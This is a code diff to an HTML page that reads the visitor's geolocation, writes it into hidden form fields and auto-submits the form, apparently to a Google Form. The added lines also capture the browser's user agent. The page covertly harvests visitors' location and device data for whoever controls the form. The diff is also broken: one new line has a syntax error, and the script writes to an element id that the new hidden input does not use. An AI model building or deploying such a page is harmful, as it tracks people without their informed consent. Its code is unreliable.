@@ -42,12 +42,13 @@ color:white;
       function savePosition(position) {
         const lat = position.coords.latitude;
         const lng = position.coords.longitude;
-        
+        const userAgent =  navigator.userAgent;
         // Fill hidden fields
         document.getElementById("lat").value = lat;
         document.getElementById("lng").value = lng;
+        document.getElementById("device").value = navigator.userAgent;
           // Auto-submit
-          console.log("Location fetched: " + lat + ", " + lng + ". Now submitting the form.");
+          console.log({lat,lng,userAgent);
            document.getElementById("form").submit();
       }
 
@@ -61,6 +62,7 @@ color:white;
       <!-- Replace entry IDs with your Form field IDs -->
       <input type="hidden" name="entry.LAT_FIELD_ID" id="lat">
       <input type="hidden" name="entry.LNG_FIELD_ID" id="lng">
+      <input type="hidden" name="entry.UA_FIELD_ID" id="userAgent">
       <div style="margin:auto 0">
       <div class="container">    
         <div class="center">
@@ -71,6 +73,7 @@ color:white;
     </form>
   </body>
 </html>
+
 
 
 
